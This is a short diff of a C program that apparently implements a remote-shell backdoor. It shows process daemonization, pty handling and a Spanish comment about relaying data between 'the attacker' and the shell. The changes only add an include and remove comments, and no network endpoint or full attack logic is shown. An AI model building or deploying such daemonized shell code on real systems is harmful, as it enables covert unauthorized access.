@@ -12,12 +12,13 @@
 #include <sys/stat.h>
 #include <signal.h>
 #include <pty.h>
+#include <utmp.h>
 #include <string.h>
 
 void daemonize() {
     pid_t pid = fork();
     if (pid < 0) exit(1);
-    if (pid > 0) exit(0); // Salir del proceso padre
+    if (pid > 0) exit(0);
 
     if (setsid() < 0) exit(1);
     signal(SIGHUP, SIG_IGN);
@@ -79,7 +80,7 @@ int main() {
 
         close(slave_fd);
 
-        // 🔄 Redirigir datos entre el atacante y la shell
+        // Redirigir datos entre el atacante y la shell
         char buffer[1024];
         ssize_t n;
         fd_set fds;
